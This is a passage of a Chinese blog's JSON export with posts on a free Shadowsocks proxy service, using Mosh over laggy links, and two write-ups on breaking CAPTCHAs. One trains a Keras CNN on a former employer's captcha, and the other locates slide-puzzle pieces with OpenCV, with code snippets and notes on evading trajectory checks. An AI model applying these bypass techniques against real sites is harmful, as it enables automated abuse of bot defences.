\n改了下UI搭了个网站。本网站提供的翻墙服务是完全免费的，只需要通过邮箱注册帐号，就可以获得每天500M的免费流量，满足学生狗和科研狗查资料的基本需求。反正每月1000G的流量我一个人也是用不完的。\n网站地址： http://fuck-the-wall.chxj.name\n[http://fuck-the-wall.chxj.name]\n\n如果你喜欢这个网站，可以打开支付宝扫描网址底部的二维码(或长按图片识别图中二维码)向我打赏一元，以示鼓励!\n当然，也可以不打赏。更要感谢Shadowsocks作者 @clowwindy [https://github.com/clowwindy] \n无私的开源精神以及为争取人民自由意志所做作出的杰出贡献。 网站的代码及镜像同样是开源的，所以如果你有一台墙外的VPS，你也可以直接使用这个Docker镜像\n[https://hub.docker.com/r/chxj1992/shadowsocks-manager-docker/]\n在自己的服务器上搭建一个翻墙服务并分享给你的朋友们。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":"shadowsocks manager","meta_description":"shadowsocks manager 分享VPS的闲置流量","author_id":"1","created_at":"2017-05-11 15:49:45","updated_at":"2017-06-30 08:34:32","published_at":"2017-06-30 08:27:38","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e7b","uuid":"5164aef7-7adb-4a7a-b5a9-09760dd1221f","title":"终端登录VPS延迟太高？试试Mosh","slug":"mosh","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"把服务器迁到日本后，比较坑的一个问题出现了，虽然日本离中国这么近，`ping`的延迟还是有好几百毫秒，HTTP访问机器上的服务倒是没什么影响，但是 `ssh` 登录到终端问题就来了， `ssh` 采用 TCP 方式建立连接，并且每输入一个字符，都需要等待其服务端返回确认后才能发送下一个字符，再加上网络可能会有丢包什么的情况，造成的后果就是，输入任何一条命令，都会一卡...一卡...一卡......\\n\\n[Mosh](https://mosh.org/) 可以认为是高延迟网络环境下 `ssh` 的一个替代选择，[Github](https://github.com/mobile-shell/mosh)上star 6K 多还是挺屌的，Mosh采用UDP的方式进行通信。好了，我一共就知道这么多。\\n\\n![mosh](/content/images/2017/06/mosh.png)\\n\\nMosh除了不会再卡了，Mosh还有一个显著的优点，是即使断网Mosh的也不会断开，因为毕竟是通过UDP进行数据传输，并没有建立实际上的连接。\\n\\n来看看具体怎么使用吧。\\n\\n在服务器上启动 `mosh-server`， 在自己的设备上用 `mosh` 去连，和 `ssh` 看起来是一样的。\\n\\n```\\nmosh [user@]host\\n```\\n\\n使用起来总体感受还是很顺畅的，起码输命令不会卡了。\\n\\n更多的细节，就请参见官方的 [使用指南](https://mosh.org/#usage)吧！\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>把服务器迁到日本后，比较坑的一个问题出现了，虽然日本离中国这么近，<code>ping</code>的延迟还是有好几百毫秒，HTTP访问机器上的服务倒是没什么影响，但是 <code>ssh</code> 登录到终端问题就来了， <code>ssh</code> 采用 TCP 方式建立连接，并且每输入一个字符，都需要等待其服务端返回确认后才能发送下一个字符，再加上网络可能会有丢包什么的情况，造成的后果就是，输入任何一条命令，都会一卡...一卡...一卡......</p>\n<p><a href=\"https://mosh.org/\">Mosh</a> 可以认为是高延迟网络环境下 <code>ssh</code> 的一个替代选择，<a href=\"https://github.com/mobile-shell/mosh\">Github</a>上star 6K 多还是挺屌的，Mosh采用UDP的方式进行通信。好了，我一共就知道这么多。</p>\n<p><img src=\"/content/images/2017/06/mosh.png\" alt=\"mosh\"></p>\n<p>Mosh除了不会再卡了，Mosh还有一个显著的优点，是即使断网Mosh的也不会断开，因为毕竟是通过UDP进行数据传输，并没有建立实际上的连接。</p>\n<p>来看看具体怎么使用吧。</p>\n<p>在服务器上启动 <code>mosh-server</code>， 在自己的设备上用 <code>mosh</code> 去连，和 <code>ssh</code> 看起来是一样的。</p>\n<pre><code>mosh [user@]host\n</code></pre>\n<p>使用起来总体感受还是很顺畅的，起码输命令不会卡了。</p>\n<p>更多的细节，就请参见官方的 <a href=\"https://mosh.org/#usage\">使用指南</a>吧！</p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"61","plaintext":"把服务器迁到日本后，比较坑的一个问题出现了，虽然日本离中国这么近，ping的延迟还是有好几百毫秒，HTTP访问机器上的服务倒是没什么影响，但是 ssh \n登录到终端问题就来了， ssh  采用 TCP\n方式建立连接，并且每输入一个字符，都需要等待其服务端返回确认后才能发送下一个字符，再加上网络可能会有丢包什么的情况，造成的后果就是，输入任何一条命令，都会一卡...一卡...一卡......\n\nMosh [https://mosh.org/]  可以认为是高延迟网络环境下 ssh  的一个替代选择，Github\n[https://github.com/mobile-shell/mosh]上star 6K\n多还是挺屌的，Mosh采用UDP的方式进行通信。好了，我一共就知道这么多。\n\n\n\nMosh除了不会再卡了，Mosh还有一个显著的优点，是即使断网Mosh的也不会断开，因为毕竟是通过UDP进行数据传输，并没有建立实际上的连接。\n\n来看看具体怎么使用吧。\n\n在服务器上启动 mosh-server， 在自己的设备上用 mosh  去连，和 ssh  看起来是一样的。\n\nmosh [user@]host\n\n\n使用起来总体感受还是很顺畅的，起码输命令不会卡了。\n\n更多的细节，就请参见官方的 使用指南 [https://mosh.org/#usage]吧！","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":"mosh","meta_description":"mosh vps终端卡顿 命令行网络延迟","author_id":"1","created_at":"2017-06-30 08:38:36","updated_at":"2017-06-30 09:01:25","published_at":"2017-06-30 09:00:13","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e7c","uuid":"ebe09462-fa34-4d65-87f9-68d9f5463d1d","title":"用卷积神经网络识别普通验证码","slug":"crack-captcha","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"最近在学习神经网络的相关知识，也谈谈自己目前对神经网络一些浅薄的认识。\\n\\n实际生产生活中的很多问题都可以理解成如何建立从一个集合到另一个集合的映射关系的问题，也可以说成是，如何设计一个函数的问题。这个函数有一组权重参数，输入集合的数据经过权重参数的处理对应到不同的输出数据。而所谓的神经网络正是由一层一层这样的函数堆叠组成，所以神经网络也叫深度学习。深度学习中最重要一个环节就是通过大量的数据对各层函数的权重参数进行训练，所谓学习（训练）便是通过不断地修正，使权重参数慢慢趋于准确，尽量让所有训练数据的输入在经过权重参数的处理后都能映射到正确的输出，这样的学习（训练）过程往往需要将训练数据一轮一轮的输入我们设计的神经网络模型中，经过长时间反复拟合来实现。\\n\\n神经网络中的 `误差函数` 即是一个能表示当前输入数据经过权重参数处理后得到的实际输出和预期输出之间误差大小的函数。我们的目的则可以表述为求取误差函数值最小时对应权重参数的值，当把误差函数用权重参数来表达时，这个问题又可以理解成求误差函数的极小值（一定区间内的最小值），即误差函数对于权重参数导数为0的那一个点。在计算机的数学优化方法中，一般采用梯度下降法来解决这个问题，而所谓梯度下降法，即从误差函数上的一点开始，沿着梯度（导数）下降的方向一点一点地逼近，最终得到一个近似的误差极小的点。梯度下降法是神经网络理论中最基础的知识。而其他如随机梯度下降、批量梯度下降和小批量梯度下降都是对上面提到的梯度下降法的优化，而其本质思想是相同的。而其他的一些相关知识也大都围绕着这一基本思想展开。如学习速度（learning rate）是对在梯度下降的过程中每一步移动大小的表述，而各种各样的优化器则是针对如何让程序自动地选取最合适的学习速率所设计的算法。\\n\\n![](/content/images/2017/06/nerual-network.png)\\n\\n常见的神经网络模型大概分为:全连接神经网络、卷积神经网络、循环神经网络等几个大类。本文所提及的卷积神经网络借鉴了数字图像处理中使用算子对图片特征进行提取的方法，在深度学习中，也常被用于处理图像方面的问题。卷积神经网络的每一层会生成一些算子并通过这些算子来提取图像特征最后对应到一个分类中，与全连接神经网络的思路类似，程序通过比较实际输出与预期输出之间的差异得到误差函数并将误差反向传播给各层网络从而实现对生成算子的修正。卷积神经网络中的算子与全连接神经网络里权重参数的概念类似。\\n\\n![cnn](/content/images/2017/07/cnn.jpg)\\n\\n关于深度学习,我目前的了解基本就是这些，在这段时间的学习过程中，有一个 [关于深度学习基础知识的系列教程](https://www.zybuluo.com/hanbingtao/note/433855) 给了我很大的帮助，这里也推荐给大家。\\n\\n有了这些关于神经网络的基础知识，我就想有个机会可以真正实践一下，突然想到前公司的验证码，正好可以拿来做做文章。有之前在项目上的知识背景，我知道项目采用的验证码是通过一款 [Laravel](https://laravel.com) 社区中流行的验证码生成库 [Captcha](https://github.com/mewebstudio/captcha/) 来生成的。这就为我提供了准备训练数据的可能性。\\n\\n[破解Captcha验证码的完整代码](https://github.com/chxj1992/captcha_cracker)已经放在Github上了，代码实现的比较粗糙，细节上也可能有诸多考虑不完善的地方，一方面是为自己学习，也是提供一个思路供读者参考。不过首先，可以通过 [这个Demo](http://captcha.chxj.name/) 简单感受一下最后实现的效果。\\n\\n[![](https://github.com/chxj1992/captcha_cracker/raw/master/screenshot.png)](captcha.chxj.name)\\n\\n对于用神经网络来破解验证码的这个问题，我的思路是这样的：首先将4位的验证码图片分割成每张图片一个字符的四张图片，通过卷积神经网络对每张图片进行学习后对应到一个字符的分类。考虑到 [Captcha](https://github.com/mewebstudio/captcha/) 生成的验证码每个字符所占的宽度比较均匀，我直接采用了四等分的方式将图片分成四分，使逻辑尽量简单。\\n\\n在具体的实现代码中，我用PHP将2000条验证码拆分成单个字符以字符作为目录存放在 `images` 目录下作为训练数据，再通过 `pack_data.py` 将数据打包为一个二进制文件以便批量读取，最后执行 `train.py` 对数据进行训练。而 `model.py` 中的模型正是一个最基本的卷积神经网络。\\n\\n```\\ny_train = keras.utils.to_categorical(y_train, num_classes)\\ny_test = keras.utils.to_categorical(y_test, num_classes)\\n\\nx_train = x_train.astype('float32')\\nx_test = x_test.astype('float32')\\nx_train /= 255\\nx_test /= 255\\n\\nmodel = m.build(x_train.shape[1:], num_classes)\\n\\nmodel.fit(x_train, y_train,\\n          batch_size=batch_size,\\n          epochs=epochs,\\n          validation_data=(x_test, y_test),\\n          shuffle=True)\\n\\nmodel.save_weights('weights.hdf5')\\n```\\n\\n本次实验中神经网络的模型是基于一款比较流行的深度学习框架 [Keras](https://keras.io/) 来编写的。通过对2000个验证码累计200轮的训练，最终该模型对新数据单个字符识别的准确率大概在92%的水平。从结果来看，这个数据的水平还是相当低的。考虑原因，我觉得主要可能有以下几个因素：\\n\\n * 训练数据而样本数量较少\\n * 没有对生成的二维码图片进行任何处理导致图片中的干扰信息较多\\n * 直接把验证码四等分的做法会导致有很多字符不完整，也使得训练受到影响\\n\\n不过即便是如此，从实用的角度出发，这样的正确率也足以对一个投入生产的项目造成不小的威胁。当然，最终能达成这样的目的，很大程度上还是由于我个人对项目的了解，深度学习如果离开了大量的训练数据作为支撑，也无法达成令人满意的效果。所以从这个角度来说，这次实验并不具有太大的普遍性，更多的还是一次自我学习与思考的过程。\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>最近在学习神经网络的相关知识，也谈谈自己目前对神经网络一些浅薄的认识。</p>\n<p>实际生产生活中的很多问题都可以理解成如何建立从一个集合到另一个集合的映射关系的问题，也可以说成是，如何设计一个函数的问题。这个函数有一组权重参数，输入集合的数据经过权重参数的处理对应到不同的输出数据。而所谓的神经网络正是由一层一层这样的函数堆叠组成，所以神经网络也叫深度学习。深度学习中最重要一个环节就是通过大量的数据对各层函数的权重参数进行训练，所谓学习（训练）便是通过不断地修正，使权重参数慢慢趋于准确，尽量让所有训练数据的输入在经过权重参数的处理后都能映射到正确的输出，这样的学习（训练）过程往往需要将训练数据一轮一轮的输入我们设计的神经网络模型中，经过长时间反复拟合来实现。</p>\n<p>神经网络中的 <code>误差函数</code> 即是一个能表示当前输入数据经过权重参数处理后得到的实际输出和预期输出之间误差大小的函数。我们的目的则可以表述为求取误差函数值最小时对应权重参数的值，当把误差函数用权重参数来表达时，这个问题又可以理解成求误差函数的极小值（一定区间内的最小值），即误差函数对于权重参数导数为0的那一个点。在计算机的数学优化方法中，一般采用梯度下降法来解决这个问题，而所谓梯度下降法，即从误差函数上的一点开始，沿着梯度（导数）下降的方向一点一点地逼近，最终得到一个近似的误差极小的点。梯度下降法是神经网络理论中最基础的知识。而其他如随机梯度下降、批量梯度下降和小批量梯度下降都是对上面提到的梯度下降法的优化，而其本质思想是相同的。而其他的一些相关知识也大都围绕着这一基本思想展开。如学习速度（learning rate）是对在梯度下降的过程中每一步移动大小的表述，而各种各样的优化器则是针对如何让程序自动地选取最合适的学习速率所设计的算法。</p>\n<p><img src=\"/content/images/2017/06/nerual-network.png\" alt=\"\"></p>\n<p>常见的神经网络模型大概分为:全连接神经网络、卷积神经网络、循环神经网络等几个大类。本文所提及的卷积神经网络借鉴了数字图像处理中使用算子对图片特征进行提取的方法，在深度学习中，也常被用于处理图像方面的问题。卷积神经网络的每一层会生成一些算子并通过这些算子来提取图像特征最后对应到一个分类中，与全连接神经网络的思路类似，程序通过比较实际输出与预期输出之间的差异得到误差函数并将误差反向传播给各层网络从而实现对生成算子的修正。卷积神经网络中的算子与全连接神经网络里权重参数的概念类似。</p>\n<p><img src=\"/content/images/2017/07/cnn.jpg\" alt=\"cnn\"></p>\n<p>关于深度学习,我目前的了解基本就是这些，在这段时间的学习过程中，有一个 <a href=\"https://www.zybuluo.com/hanbingtao/note/433855\">关于深度学习基础知识的系列教程</a> 给了我很大的帮助，这里也推荐给大家。</p>\n<p>有了这些关于神经网络的基础知识，我就想有个机会可以真正实践一下，突然想到前公司的验证码，正好可以拿来做做文章。有之前在项目上的知识背景，我知道项目采用的验证码是通过一款 <a href=\"https://laravel.com\">Laravel</a> 社区中流行的验证码生成库 <a href=\"https://github.com/mewebstudio/captcha/\">Captcha</a> 来生成的。这就为我提供了准备训练数据的可能性。</p>\n<p><a href=\"https://github.com/chxj1992/captcha_cracker\">破解Captcha验证码的完整代码</a>已经放在Github上了，代码实现的比较粗糙，细节上也可能有诸多考虑不完善的地方，一方面是为自己学习，也是提供一个思路供读者参考。不过首先，可以通过 <a href=\"http://captcha.chxj.name/\">这个Demo</a> 简单感受一下最后实现的效果。</p>\n<p><a href=\"captcha.chxj.name\"><img src=\"https://github.com/chxj1992/captcha_cracker/raw/master/screenshot.png\" alt=\"\"></a></p>\n<p>对于用神经网络来破解验证码的这个问题，我的思路是这样的：首先将4位的验证码图片分割成每张图片一个字符的四张图片，通过卷积神经网络对每张图片进行学习后对应到一个字符的分类。考虑到 <a href=\"https://github.com/mewebstudio/captcha/\">Captcha</a> 生成的验证码每个字符所占的宽度比较均匀，我直接采用了四等分的方式将图片分成四分，使逻辑尽量简单。</p>\n<p>在具体的实现代码中，我用PHP将2000条验证码拆分成单个字符以字符作为目录存放在 <code>images</code> 目录下作为训练数据，再通过 <code>pack_data.py</code> 将数据打包为一个二进制文件以便批量读取，最后执行 <code>train.py</code> 对数据进行训练。而 <code>model.py</code> 中的模型正是一个最基本的卷积神经网络。</p>\n<pre><code>y_train = keras.utils.to_categorical(y_train, num_classes)\ny_test = keras.utils.to_categorical(y_test, num_classes)\n\nx_train = x_train.astype('float32')\nx_test = x_test.astype('float32')\nx_train /= 255\nx_test /= 255\n\nmodel = m.build(x_train.shape[1:], num_classes)\n\nmodel.fit(x_train, y_train,\n          batch_size=batch_size,\n          epochs=epochs,\n          validation_data=(x_test, y_test),\n          shuffle=True)\n\nmodel.save_weights('weights.hdf5')\n</code></pre>\n<p>本次实验中神经网络的模型是基于一款比较流行的深度学习框架 <a href=\"https://keras.io/\">Keras</a> 来编写的。通过对2000个验证码累计200轮的训练，最终该模型对新数据单个字符识别的准确率大概在92%的水平。从结果来看，这个数据的水平还是相当低的。考虑原因，我觉得主要可能有以下几个因素：</p>\n<ul>\n<li>训练数据而样本数量较少</li>\n<li>没有对生成的二维码图片进行任何处理导致图片中的干扰信息较多</li>\n<li>直接把验证码四等分的做法会导致有很多字符不完整，也使得训练受到影响</li>\n</ul>\n<p>不过即便是如此，从实用的角度出发，这样的正确率也足以对一个投入生产的项目造成不小的威胁。当然，最终能达成这样的目的，很大程度上还是由于我个人对项目的了解，深度学习如果离开了大量的训练数据作为支撑，也无法达成令人满意的效果。所以从这个角度来说，这次实验并不具有太大的普遍性，更多的还是一次自我学习与思考的过程。</p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"62","plaintext":"最近在学习神经网络的相关知识，也谈谈自己目前对神经网络一些浅薄的认识。\n\n实际生产生活中的很多问题都可以理解成如何建立从一个集合到另一个集合的映射关系的问题，也可以说成是，如何设计一个函数的问题。这个函数有一组权重参数，输入集合的数据经过权重参数的处理对应到不同的输出数据。而所谓的神经网络正是由一层一层这样的函数堆叠组成，所以神经网络也叫深度学习。深度学习中最重要一个环节就是通过大量的数据对各层函数的权重参数进行训练，所谓学习（训练）便是通过不断地修正，使权重参数慢慢趋于准确，尽量让所有训练数据的输入在经过权重参数的处理后都能映射到正确的输出，这样的学习（训练）过程往往需要将训练数据一轮一轮的输入我们设计的神经网络模型中，经过长时间反复拟合来实现。\n\n神经网络中的 误差函数 \n即是一个能表示当前输入数据经过权重参数处理后得到的实际输出和预期输出之间误差大小的函数。我们的目的则可以表述为求取误差函数值最小时对应权重参数的值，当把误差函数用权重参数来表达时，这个问题又可以理解成求误差函数的极小值（一定区间内的最小值），即误差函数对于权重参数导数为0的那一个点。在计算机的数学优化方法中，一般采用梯度下降法来解决这个问题，而所谓梯度下降法，即从误差函数上的一点开始，沿着梯度（导数）下降的方向一点一点地逼近，最终得到一个近似的误差极小的点。梯度下降法是神经网络理论中最基础的知识。而其他如随机梯度下降、批量梯度下降和小批量梯度下降都是对上面提到的梯度下降法的优化，而其本质思想是相同的。而其他的一些相关知识也大都围绕着这一基本思想展开。如学习速度（learning\nrate）是对在梯度下降的过程中每一步移动大小的表述，而各种各样的优化器则是针对如何让程序自动地选取最合适的学习速率所设计的算法。\n\n\n\n常见的神经网络模型大概分为:全连接神经网络、卷积神经网络、循环神经网络等几个大类。本文所提及的卷积神经网络借鉴了数字图像处理中使用算子对图片特征进行提取的方法，在深度学习中，也常被用于处理图像方面的问题。卷积神经网络的每一层会生成一些算子并通过这些算子来提取图像特征最后对应到一个分类中，与全连接神经网络的思路类似，程序通过比较实际输出与预期输出之间的差异得到误差函数并将误差反向传播给各层网络从而实现对生成算子的修正。卷积神经网络中的算子与全连接神经网络里权重参数的概念类似。\n\n\n\n关于深度学习,我目前的了解基本就是这些，在这段时间的学习过程中，有一个 关于深度学习基础知识的系列教程\n[https://www.zybuluo.com/hanbingtao/note/433855]  给了我很大的帮助，这里也推荐给大家。\n\n有了这些关于神经网络的基础知识，我就想有个机会可以真正实践一下，突然想到前公司的验证码，正好可以拿来做做文章。有之前在项目上的知识背景，我知道项目采用的验证码是通过一款\n Laravel [https://laravel.com]  社区中流行的验证码生成库 Captcha\n[https://github.com/mewebstudio/captcha/]  来生成的。这就为我提供了准备训练数据的可能性。\n\n破解Captcha验证码的完整代码 [https://github.com/chxj1992/captcha_cracker]\n已经放在Github上了，代码实现的比较粗糙，细节上也可能有诸多考虑不完善的地方，一方面是为自己学习，也是提供一个思路供读者参考。不过首先，可以通过 \n这个Demo [http://captcha.chxj.name/]  简单感受一下最后实现的效果。\n\n  [captcha.chxj.name]\n\n对于用神经网络来破解验证码的这个问题，我的思路是这样的：首先将4位的验证码图片分割成每张图片一个字符的四张图片，通过卷积神经网络对每张图片进行学习后对应到一个字符的分类。考虑到\n Captcha [https://github.com/mewebstudio/captcha/] \n生成的验证码每个字符所占的宽度比较均匀，我直接采用了四等分的方式将图片分成四分，使逻辑尽量简单。\n\n在具体的实现代码中，我用PHP将2000条验证码拆分成单个字符以字符作为目录存放在 images  目录下作为训练数据，再通过 pack_data.py \n将数据打包为一个二进制文件以便批量读取，最后执行 train.py  对数据进行训练。而 model.py  中的模型正是一个最基本的卷积神经网络。\n\ny_train = keras.utils.to_categorical(y_train, num_classes)\ny_test = keras.utils.to_categorical(y_test, num_classes)\n\nx_train = x_train.astype('float32')\nx_test = x_test.astype('float32')\nx_train /= 255\nx_test /= 255\n\nmodel = m.build(x_train.shape[1:], num_classes)\n\nmodel.fit(x_train, y_train,\n          batch_size=batch_size,\n          epochs=epochs,\n          validation_data=(x_test, y_test),\n          shuffle=True)\n\nmodel.save_weights('weights.hdf5')\n\n\n本次实验中神经网络的模型是基于一款比较流行的深度学习框架 Keras [https://keras.io/] \n来编写的。通过对2000个验证码累计200轮的训练，最终该模型对新数据单个字符识别的准确率大概在92%的水平。从结果来看，这个数据的水平还是相当低的。考虑原因，我觉得主要可能有以下几个因素：\n\n * 训练数据而样本数量较少\n * 没有对生成的二维码图片进行任何处理导致图片中的干扰信息较多\n * 直接把验证码四等分的做法会导致有很多字符不完整，也使得训练受到影响\n\n不过即便是如此，从实用的角度出发，这样的正确率也足以对一个投入生产的项目造成不小的威胁。当然，最终能达成这样的目的，很大程度上还是由于我个人对项目的了解，深度学习如果离开了大量的训练数据作为支撑，也无法达成令人满意的效果。所以从这个角度来说，这次实验并不具有太大的普遍性，更多的还是一次自我学习与思考的过程。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-06-30 09:02:13","updated_at":"2017-07-01 14:47:17","published_at":"2017-07-01 14:39:56","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e7d","uuid":"75262f71-f908-4998-b269-08c4c958cae9","title":"利用图像边缘检测算子破解滑动拼图验证码","slug":"crack-slide-captcha","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"在之前用[神经网络的方法搞了一把前公司的验证码](http://blog.chxj.name/crack-captcha)以后，前同事们也快速作出响应，迅速把普通验证码换成了滑动拼图验证码，然后还说：\\n\\n![](/content/images/2017/06/chat1.jpg)\\n\\n我觉得我可能是和验证码杠上了。\\n\\n滑动验证码拼图的定位问题只是破解过程中的一个环节，我的方案主要采用 `opencv` 提供的函数对图片进行处理后来实现定位，在这里只提供一个思路，抛砖引玉了。\\n\\n最终的实现效果可以通过 [这个Demo](http://slide-captcha.chxj.name/) 简单感受一下。相比之前用神经网络训练来破解普通验证码，这次的实现方式可能更具通用性，因为不用再依赖训练数据。\\n\\n[![](https://github.com/chxj1992/slide_captcha_cracker/raw/master/screenshot.png)](http://slide-captcha.chxj.name/)\\n\\n\\n\\n#### 关于滑动验证码\\n\\n演示项目所用到的滑动验证码实现相对简单，整个交互过程主要包含以下步骤：\\n\\n* 服务端将背景图片和拼图图片合并为一张图片，并记录下拼图在背景图中的`x坐标`，然后将拼好图片和单独的拼图图片返回给客户端\\n* 客户端实现单片拼图在背景图上拖动的动画效果，并在用户完成拖动动作后，将当前拼图所处位置的坐标数据加密后返回给服务端\\n* 服务端解密数据并比较客户端返回的`x坐标`数据并与之前保存的`x坐标`数据进行比较，允许小范围内的误差\\n\\n\\n#### 实现原理\\n\\n基于以上的验证码实现，本例子通过以下方式实现对验证码拼图在背景图中的定位（其他步骤较为简单，不做考虑）：\\n\\n* 利用`opencv`库中提供的边界查找函数(cv2.findContours)提取单片拼图边缘轨迹并构造成一个二维矩阵（算子），具体代码如下：\\n```\\n shape = cv2.resize(cv2.imread('shape.png'), (shape_height, shape_width))\\n shape_gray = cv2.cvtColor(shape, cv2.COLOR_BGR2GRAY)\\n\\n# 查找边界函数（findContours）要求先将图片转换为binary格式\\n _, shape_binary = cv2.threshold(shape_gray, 127, 255, cv2.THRESH_BINARY)\\n _, contours, hierarchy = cv2.findContours(shape_binary, cv2.RETR_TREE, cv2.CHAIN_APPROX_NONE)\\n\\n#所得到的contours是所有边界的列表，拼图图片中只会匹配到一个边界\\ncontour = contours[0]\\n\\n# 边界数据是一个边界点所在坐标构成的列表\\noperator = np.zeros((shape_height, shape_width))\\n\\n# 这里需要返回一个拼图边界的矩阵用来在背景图中做匹配\\nfor point in contour:\\n  operator[point[0][0]][point[0][1]] = 1\\n\\n```\\n\\n* 利用 `高斯模糊算子`（cv2.GaussianBlur）和 `Canny边缘检测算子`（cv2.Canny）对背景图进行处理，凸显出拼图在图片中的边缘，具体代码如下：\\n```\\n  img_blur = cv2.GaussianBlur(img, (3, 3), 0)\\n  img_gray = cv2.cvtColor(img_blur, cv2.COLOR_BGR2GRAY)\\n  img_canny = cv2.Canny(img_gray, 100, 200)\\n```\\n\\n* 用拼图轨迹算子在处理后的背景图上进行 `互相关操作`，所得最大（小）值的位置就是拼图在背景图中的坐标\\n\\n关于这个 `Canny` 边缘检测算子，我也小小的研究了一下，毕竟还是读了四年电工专业，没准还是以前上课学过的。推荐大家阅读这篇 [Canny边缘检测的文章](http://www.opencv.org.cn/opencvdoc/2.3.2/html/doc/tutorials/imgproc/imgtrans/canny_detector/canny_detector.html)，已经把算法的原理说得很清楚了。\\n\\n#### 其他思考\\n\\n拼图的定位只是破解滑动验证码的一个中间环节，想要破解一个好的验证码产品除了定位拼图在整个图片中的位置外，可能还有以下几个问题需要考虑：\\n\\n* 从服务端获取的背景图可能是经过加密的（需要阅读js源码获得恢复图片的算法）\\n* 返回给服务端的参数一般是经过加密处理的（需要阅读js源码理解算法）\\n* 服务端可能会对用户滑动行为的移动轨迹对用户进行校验（可以尝试通过selenium等工具模拟拖动行为，或者积累真实的拖动数据后学习规律并通过js源码获得构造数据的算法）\\n\\n其实，我觉得对滑动轨迹的检测也是一个重点，但如果不是用第三方（比如极验之类）提供的实现，自己也比较难做好对轨迹的校验，前同事的这个就是自己实现的，不存在轨迹检测的问题，所以这里只讨论定位拼图位置这一点。\\n\\n所以总体的感觉是，拼图式滑动验证码的用户体验更好，但是从安全度上看，可能还不如传统的普通验证码。\\n\\n之前也考虑过是否可以尝试用深度学习的方法来达到目的，但如果用深度学习的方法来解决这个问题，将会有几个显著的问题需要面对。首先深度学习需要依赖大量的训练数据，这个条件不具备。其次，如果是以背景图上的坐标点作为输出结果来进行分类，因为点很多，训练难度会比较大。再有就是如果背景图发生变化，之前训练的模型也就失效了。综合以上因素，最终选择了边缘检测的方法来结局这个问题，突然感觉大学的专业课知识还是没有白学。不过毕竟是现炒现卖，还是比较肤浅，但是呢，至少目的还是达到了。\\n\\n![](/content/images/2017/06/chat2.jpg)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>在之前用<a href=\"http://blog.chxj.name/crack-captcha\">神经网络的方法搞了一把前公司的验证码</a>以后，前同事们也快速作出响应，迅速把普通验证码换成了滑动拼图验证码，然后还说：</p>\n<p><img src=\"/content/images/2017/06/chat1.jpg\" alt=\"\"></p>\n<p>我觉得我可能是和验证码杠上了。</p>\n<p>滑动验证码拼图的定位问题只是破解过程中的一个环节，我的方案主要采用 <code>opencv</code> 提供的函数对图片进行处理后来实现定位，在这里只提供一个思路，抛砖引玉了。</p>\n<p>最终的实现效果可以通过 <a href=\"http://slide-captcha.chxj.name/\">这个Demo</a> 简单感受一下。相比之前用神经网络训练来破解普通验证码，这次的实现方式可能更具通用性，因为不用再依赖训练数据。</p>\n<p><a href=\"http://slide-captcha.chxj.name/\"><img src=\"https://github.com/chxj1992/slide_captcha_cracker/raw/master/screenshot.png\" alt=\"\"></a></p>\n<h4 id=\"\">关于滑动验证码</h4>\n<p>演示项目所用到的滑动验证码实现相对简单，整个交互过程主要包含以下步骤：</p>\n<ul>\n<li>服务端将背景图片和拼图图片合并为一张图片，并记录下拼图在背景图中的<code>x坐标</code>，然后将拼好图片和单独的拼图图片返回给客户端</li>\n<li>客户端实现单片拼图在背景图上拖动的动画效果，并在用户完成拖动动作后，将当前拼图所处位置的坐标数据加密后返回给服务端</li>\n<li>服务端解密数据并比较客户端返回的<code>x坐标</code>数据并与之前保存的<code>x坐标</code>数据进行比较，允许小范围内的误差</li>\n</ul>\n<h4 id=\"\">实现原理</h4>\n<p>基于以上的验证码实现，本例子通过以下方式实现对验证码拼图在背景图中的定位（其他步骤较为简单，不做考虑）：</p>\n<ul>\n<li>利用<code>opencv</code>库中提供的边界查找函数(cv2.findContours)提取单片拼图边缘轨迹并构造成一个二维矩阵（算子），具体代码如下：</li>\n</ul>\n<pre><code> shape = cv2.resize(cv2.imread('shape.png'), (shape_height, shape_width))\n shape_gray = cv2.cvtColor(shape, cv2.COLOR_BGR2GRAY)\n\n# 查找边界函数（findContours）要求先将图片转换为binary格式\n _, shape_binary = cv2.threshold(shape_gray, 127, 255, cv2.THRESH_BINARY)\n _, contours, hierarchy = cv2.findContours(shape_binary, cv2.RETR_TREE, cv2.CHAIN_APPROX_NONE)\n\n#所得到的contours是所有边界的列表，拼图图片中只会匹配到一个边界\ncontour = contours[0]\n\n# 边界数据是一个边界点所在坐标构成的列表\noperator = np.zeros((shape_height, shape_width))\n\n# 这里需要返回一个拼图边界的矩阵用来在背景图中做匹配\nfor point in contour:\n  operator[point[0][0]][point[0][1]] = 1\n\n</code></pre>\n<ul>\n<li>利用 <code>高斯模糊算子</code>（cv2.GaussianBlur）和 